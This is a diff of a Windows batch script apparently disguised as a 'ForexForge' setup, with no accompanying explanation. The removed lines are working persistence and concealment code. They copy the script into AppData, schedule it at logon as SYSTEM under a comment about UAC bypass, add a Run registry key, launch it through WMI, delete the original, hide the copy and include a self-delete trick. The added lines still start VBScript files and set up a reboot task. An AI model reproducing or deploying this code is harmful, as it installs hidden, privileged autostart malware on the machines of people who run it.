@@ -1,38 +1,4 @@
 @echo off
-setlocal enabledelayedexpansion
-
-REM Get current path and filename
-set "scriptPath=%~dp0%~nx0"
-set "scriptName=%~n0%~x0"
-
-REM Create backup in AppData
-set "backupPath=%APPDATA%\Local"
-if not exist "%backupPath%" mkdir "%backupPath%"
-copy "%scriptPath%" "%backupPath%\ForexForge_Setup.bat" >nul
-
-REM Schedule task with UAC bypass
-schtasks /create /tn "ForexForge_Task" /tr "\"%backupPath%\ForexForge_Setup.bat\"" /sc onlogon /ru SYSTEM /f /v1
-
-REM Set startup registry key for persistence
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ForexForge /t REG_SZ /d "\"%backupPath%\ForexForge_Setup.bat\"" /f
-
-REM Create additional persistence via WMI
-wmic process call create "\"%backupPath%\ForexForge_Setup.bat\""
-
-REM Delete original file after copying
-del "%scriptPath%" /q
-
-REM Hide the backup file
-attrib +h "%backupPath%\ForexForge_Setup.bat"
-
-REM Add delay before execution (1 minute)
-timeout /t 60 /nobreak >nul
-
-REM Execute the backup version
-"%backupPath%\ForexForge_Setup.bat"
-
-
-@echo off
 setlocal
 
 :: ============================================================
@@ -78,9 +44,8 @@ if exist "launcher.vbs" (
     start "" "wscript.exe" "launcher.vbs"
 )
 
-:: Self-delete
-(goto) 2>nul & del "%~f0"
-exit
-
+:: 1. RUN THE TASK SETUP (Must be before self-delete)
+:: This calls the VBScript to set up the reboot task.
+wscript.exe "%workDir%\task.vbs"
 
 
